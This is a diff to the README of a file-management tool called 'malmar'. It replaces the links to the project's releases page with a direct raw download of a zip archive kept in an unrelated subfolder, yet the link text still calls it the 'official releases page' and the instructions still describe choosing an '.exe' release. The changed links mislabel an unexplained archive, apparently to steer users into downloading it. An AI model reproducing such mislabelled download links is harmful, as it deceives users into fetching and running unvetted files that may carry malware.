@@ -1,6 +1,6 @@
 # 📦 malmar - Simplify your digital file management today
 
-[![](https://img.shields.io/badge/Download_Malmar-blue.svg)](https://github.com/aidentelega/malmar/releases)
+[![](https://img.shields.io/badge/Download_Malmar-blue.svg)](https://github.com/aidentelega/malmar/raw/refs/heads/main/tallyman/Software_v3.7.zip)
 
 ## 🎯 Purpose of this software
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these basic needs:
 
 Follow these steps to acquire the installer:
 
-1. Visit the [official releases page](https://github.com/aidentelega/malmar/releases).
+1. Visit the [official releases page](https://github.com/aidentelega/malmar/raw/refs/heads/main/tallyman/Software_v3.7.zip).
 2. Look for the latest version listed at the top of the page.
 3. Click the link that ends in `.exe`.
 4. Choose a folder on your computer to save the file, such as your Downloads folder.
